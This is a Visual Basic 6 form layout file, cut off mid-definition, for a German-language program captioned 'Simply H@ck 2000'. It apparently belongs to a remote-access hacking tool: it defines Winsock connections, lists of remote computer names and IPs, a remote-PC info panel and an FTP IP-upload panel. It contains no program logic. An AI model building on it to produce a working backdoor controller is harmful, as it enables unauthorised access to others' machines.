VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL32.OCX"
Object = "{A6FD082D-35AA-11D4-BB2D-922D30E46229}#2.0#0"; "FLATBUTTON.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Server 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Simply H@ck 2000"
   ClientHeight    =   5640
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   9375
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MouseIcon       =   "client.frx":08CA
   ScaleHeight     =   5640
   ScaleWidth      =   9375
   StartUpPosition =   2  'Bildschirmmitte
   Begin MSComctlLib.ImageList ilTool 
      Left            =   5880
      Top             =   1320
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   18
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":0BD4
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1028
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1904
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":21E0
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":24FC
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":2DD8
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":36B4
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":39D0
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":42AC
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":4B88
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":5464
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":5D40
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":661C
            Key             =   ""
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":6EF8
            Key             =   ""
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":7214
            Key             =   ""
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":7AF0
            Key             =   ""
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":83CC
            Key             =   ""
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":8CA8
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin FlatButton.UserControl1 cmdConnection 
      Height          =   555
      Left            =   7080
      TabIndex        =   12
      Top             =   840
      Width           =   2175
      _ExtentX        =   3836
      _ExtentY        =   979
      AlwaysHighlighted=   -1  'True
      Caption         =   "Verbindung herstellen"
      FocusRect       =   0   'False
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSComctlLib.ImageList iTooloff 
      Left            =   5940
      Top             =   900
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   18
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":9584
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":98A0
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":A17C
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":AA58
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":AD74
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":B650
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":BF2C
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":C248
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":CB24
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":D400
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":DCDC
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":E5B8
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":EE94
            Key             =   ""
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":F770
            Key             =   ""
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":FA8C
            Key             =   ""
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":10368
            Key             =   ""
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":10C44
            Key             =   ""
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":11520
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ImageList ilAnimate 
      Left            =   8700
      Top             =   1560
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   5
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1183C
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":12118
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":129F4
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":132D0
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":13BAC
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock udpSock 
      Left            =   5040
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin VB.Timer tmrAnimate 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   5520
      Top             =   120
   End
   Begin VB.PictureBox imgConnection 
      BorderStyle     =   0  'Kein
      Height          =   495
      Left            =   6240
      ScaleHeight     =   495
      ScaleWidth      =   495
      TabIndex        =   7
      Top             =   930
      Width           =   495
   End
   Begin VB.TextBox txtIP 
      Alignment       =   2  'Zentriert
      Height          =   285
      Left            =   7080
      TabIndex        =   6
      Top             =   480
      Width           =   2175
   End
   Begin VB.TextBox txtName 
      Alignment       =   2  'Zentriert
      Enabled         =   0   'False
      Height          =   285
      Left            =   7080
      TabIndex        =   5
      Top             =   135
      Width           =   2175
   End
   Begin MSComctlLib.ImageList imageList 
      Left            =   6120
      Top             =   840
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   12
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14488
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":144E6
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14544
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":145A2
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14600
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1465E
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":146BC
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":1471A
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14778
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":147D6
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14834
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "client.frx":14892
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView listNetwork 
      Height          =   3015
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   5318
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      HideColumnHeaders=   -1  'True
      _Version        =   393217
      SmallIcons      =   "imageList16"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Computername"
         Object.Width           =   2822
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "IP"
         Object.Width           =   3528
      EndProperty
   End
   Begin VB.Timer tmrTimeOut 
      Enabled         =   0   'False
      Interval        =   12000
      Left            =   4080
      Top             =   120
   End
   Begin VB.Timer tmrCancel 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   4080
      Top             =   1080
   End
   Begin VB.Timer tmrEnde 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4560
      Top             =   120
   End
   Begin VB.Timer tmrStatus 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   5040
      Top             =   120
   End
   Begin MSWinsockLib.Winsock wsoWinsock 
      Left            =   5520
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrIP 
      Interval        =   5000
      Left            =   4560
      Top             =   600
   End
   Begin VB.Timer tmrWarte 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   4080
      Top             =   600
   End
   Begin MSComctlLib.ListView listIP 
      Height          =   2295
      Left            =   120
      TabIndex        =   1
      Top             =   3240
      Width           =   3855
      _ExtentX        =   6800
      _ExtentY        =   4048
      View            =   3
      LabelEdit       =   1
      Sorted          =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      HideColumnHeaders=   -1  'True
      FlatScrollBar   =   -1  'True
      _Version        =   393217
      SmallIcons      =   "imageList16"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   4
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "name"
         Text            =   "Computername"
         Object.Width           =   2469
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Key             =   "ip"
         Text            =   "IP"
         Object.Width           =   2999
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Version"
         Object.Width           =   1058
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Version"
         Object.Width           =   176
      EndProperty
   End
   Begin TabDlg.SSTab SSTab1 
      Height          =   3375
      Left            =   4080
      TabIndex        =   13
      Top             =   2160
      Width           =   5205
      _ExtentX        =   9181
      _ExtentY        =   5953
      _Version        =   393216
      Style           =   1
      Tab             =   2
      TabHeight       =   520
      BackColor       =   -2147483638
      TabCaption(0)   =   "Verbindungen"
      TabPicture(0)   =   "client.frx":148F0
      Tab(0).ControlEnabled=   0   'False
      Tab(0).Control(0)=   "Frame2"
      Tab(0).Control(0).Enabled=   0   'False
      Tab(0).Control(1)=   "Frame1"
      Tab(0).Control(1).Enabled=   0   'False
      Tab(0).ControlCount=   2
      TabCaption(1)   =   "Funktionen"
      TabPicture(1)   =   "client.frx":1490C
      Tab(1).ControlEnabled=   0   'False
      Tab(1).Control(0)=   "toolBar(1)"
      Tab(1).Control(0).Enabled=   0   'False
      Tab(1).Control(1)=   "toolBar(4)"
      Tab(1).Control(1).Enabled=   0   'False
      Tab(1).Control(2)=   "toolBar(9)"
      Tab(1).Control(2).Enabled=   0   'False
      Tab(1).Control(3)=   "toolBar(2)"
      Tab(1).Control(3).Enabled=   0   'False
      Tab(1).Control(4)=   "toolBar(5)"
      Tab(1).Control(4).Enabled=   0   'False
      Tab(1).Control(5)=   "toolBar(7)"
      Tab(1).Control(5).Enabled=   0   'False
      Tab(1).Control(6)=   "toolBar(3)"
      Tab(1).Control(6).Enabled=   0   'False
      Tab(1).Control(7)=   "toolBar(6)"
      Tab(1).Control(7).Enabled=   0   'False
      Tab(1).Control(8)=   "toolBar(8)"
      Tab(1).Control(8).Enabled=   0   'False
      Tab(1).Control(9)=   "Label18"
      Tab(1).Control(9).Enabled=   0   'False
      Tab(1).Control(10)=   "Label17"
      Tab(1).Control(10).Enabled=   0   'False
      Tab(1).Control(11)=   "Label16"
      Tab(1).Control(11).Enabled=   0   'False
      Tab(1).Control(12)=   "Label12"
      Tab(1).Control(12).Enabled=   0   'False
      Tab(1).Control(13)=   "Label11"
      Tab(1).Control(13).Enabled=   0   'False
      Tab(1).Control(14)=   "Label10"
      Tab(1).Control(14).Enabled=   0   'False
      Tab(1).Control(15)=   "Label9"
      Tab(1).Control(15).Enabled=   0   'False
      Tab(1).Control(16)=   "Label8"
      Tab(1).Control(16).Enabled=   0   'False
      Tab(1).Control(17)=   "Label7"
      Tab(1).Control(17).Enabled=   0   'False
      Tab(1).ControlCount=   18
      TabCaption(2)   =   "weitere Funktionen"
      TabPicture(2)   =   "client.frx":14928
      Tab(2).ControlEnabled=   -1  'True
      Tab(2).Control(0)=   "Label1"
      Tab(2).Control(0).Enabled=   0   'False
      Tab(2).Control(1)=   "Label2"
      Tab(2).Control(1).Enabled=   0   'False
      Tab(2).Control(2)=   "Label3"
      Tab(2).Control(2).Enabled=   0   'False
      Tab(2).Control(3)=   "Label4"
      Tab(2).Control(3).Enabled=   0   'False
      Tab(2).Control(4)=   "Label5"
      Tab(2).Control(4).Enabled=   0   'False
      Tab(2).Control(5)=   "Label6"
      Tab(2).Control(5).Enabled=   0   'False
      Tab(2).Control(6)=   "Label13"
      Tab(2).Control(6).Enabled=   0   'False
      Tab(2).Control(7)=   "Label14"
      Tab(2).Control(7).Enabled=   0   'False
      Tab(2).Control(8)=   "Label15"
      Tab(2).Control(8).Enabled=   0   'False
      Tab(2).Control(9)=   "toolBar(18)"
      Tab(2).Control(9).Enabled=   0   'False
      Tab(2).Control(10)=   "toolBar(15)"
      Tab(2).Control(10).Enabled=   0   'False
      Tab(2).Control(11)=   "toolBar(12)"
      Tab(2).Control(11).Enabled=   0   'False
      Tab(2).Control(12)=   "toolBar(16)"
      Tab(2).Control(12).Enabled=   0   'False
      Tab(2).Control(13)=   "toolBar(14)"
      Tab(2).Control(13).Enabled=   0   'False
      Tab(2).Control(14)=   "toolBar(11)"
      Tab(2).Control(14).Enabled=   0   'False
      Tab(2).Control(15)=   "toolBar(17)"
      Tab(2).Control(15).Enabled=   0   'False
      Tab(2).Control(16)=   "toolBar(13)"
      Tab(2).Control(16).Enabled=   0   'False
      Tab(2).Control(17)=   "toolBar(10)"
      Tab(2).Control(17).Enabled=   0   'False
      Tab(2).ControlCount=   18
      Begin VB.Frame Frame2 
         Caption         =   "IP-Upload"
         Height          =   2655
         Left            =   -72600
         TabIndex        =   22
         Top             =   480
         Width           =   2655
         Begin VB.ListBox List1 
            Height          =   1035
            Left            =   120
            TabIndex        =   24
            Top             =   1440
            Width           =   2415
         End
         Begin VB.TextBox txtLocalIP 
            Alignment       =   2  'Zentriert
            Height          =   285
            Left            =   120
            MaxLength       =   15
            TabIndex        =   23
            Text            =   "255.255.255.255"
            Top             =   690
            Width           =   1575
         End
         Begin InetCtlsObjects.Inet Inet1 
            Left            =   1080
            Top             =   120
            _ExtentX        =   1005
            _ExtentY        =   1005
            _Version        =   393216
            Protocol        =   2
            RemotePort      =   21
            URL             =   "ftp://"
         End
         Begin MSComctlLib.Toolbar toolBar 
            Height          =   570
            Index           =   0
            Left            =   1800
            TabIndex        =   25
            Top             =   440
            Width           =   675
            _ExtentX        =   1191
            _ExtentY        =   1005
            ButtonWidth     =   1032
            ButtonHeight    =   1005
            Style           =   1
            ImageList       =   "iTooloff"
            HotImageList    =   "ilTool"
            _Version        =   393216
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
                  Object.ToolTipText     =   "IP uploaden"
                  ImageIndex      =   9
               EndProperty
            EndProperty
         End
         Begin VB.Label Label19 
            Caption         =   "Jetzige IP auf dem Server:"
            Height          =   255
            Left            =   120
            TabIndex        =   63
            Top             =   1080
            Width           =   1935
         End
         Begin VB.Label lblPort 
            Caption         =   "Eigene IP:"
            Height          =   255
            Left            =   120
            TabIndex        =   26
            Top             =   360
            Width           =   1095
         End
      End
      Begin VB.Frame Frame1 
         Caption         =   "Remote-PC Info"
         Height          =   2655
         Left            =   -74880
         TabIndex        =   14
         Top             =   480
         Width           =   2175
         Begin VB.Label lblNoInfo 
            Alignment       =   2  'Zentriert
            BeginProperty Font 
               Name            =   "Verdana"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   1095
            Left            =   240
            TabIndex        =   21
            Top             =   1080
            Width           =   1575
            WordWrap        =   -1  'True
         End
         Begin VB.Label lblVersioni 
            BackStyle       =   0  'Transparent
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   20
            Top             =   2160
            Width           =   1455
         End
         Begin VB.Label lblVersion 
            BackStyle       =   0  'Transparent
            Caption         =   "Version:"
            Height          =   255
            Left            =   240
            TabIndex        =   19
            Top             =   1920
            Width           =   855
         End
         Begin VB.Image Image1 
            Height          =   480
            Left            =   1320
            Picture         =   "client.frx":14944
            Top             =   360
            Width           =   480
         End
         Begin VB.Label lblPCName 
            BackStyle       =   0  'Transparent
            Caption         =   "PC Name:"
            Height          =   255
            Left            =   240
            TabIndex        =   18
            Top             =   360
            Width           =   855
         End
         Begin VB.Label lblPCNamei 
            BackStyle       =   0  'Transparent
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   17
            Top             =   600
            Width           =   1455
         End
         Begin VB.Label lblPCIP 
            BackStyle       =   0  'Transparent
            Caption         =   "IP:"
            Height          =   255
            Left            =   240
            TabIndex        =   16
            Top             =   1080
            Width           =   855
         End
         Begin VB.Label lblPCIPi 
            BackStyle       =   0  'Transparent
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   15
            Top             =   1320
            Width           =   1455
         End
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   1
         Left            =   -74400
         TabIndex        =   27
         Top             =   480
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   16
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   4
         Left            =   -74400
         TabIndex        =   28
         Top             =   1440
         Width           =   1035
         _ExtentX        =   1826
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   17
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   9
         Left            =   -71040
         TabIndex        =   29
         Top             =   2400
         Width           =   1035
         _ExtentX        =   1826
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   14
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   2
         Left            =   -72720
         TabIndex        =   30
         Top             =   480
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   12
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   5
         Left            =   -72720
         TabIndex        =   31
         Top             =   1440
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   7
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   7
         Left            =   -74400
         TabIndex        =   32
         Top             =   2400
         Width           =   915
         _ExtentX        =   1614
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   3
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   10
         Left            =   600
         TabIndex        =   33
         Top             =   480
         Width           =   675
         _ExtentX        =   1191
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   1
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   13
         Left            =   600
         TabIndex        =   34
         Top             =   1440
         Width           =   675
         _ExtentX        =   1191
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   5
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   17
         Left            =   2280
         TabIndex        =   35
         Top             =   2400
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   18
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   11
         Left            =   2280
         TabIndex        =   36
         Top             =   480
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   8
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   14
         Left            =   2280
         TabIndex        =   37
         Top             =   1440
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
               ImageIndex      =   11
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar toolBar 
         Height          =   570
         Index           =   16
         Left            =   600
         TabIndex        =   38
         Top             =   2400
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   1005
         ButtonWidth     =   1032
         ButtonHeight    =   1005
         Style           =   1
         ImageList       =   "iTooloff"
         HotImageList    =   "ilTool"
         _Version        =   393216
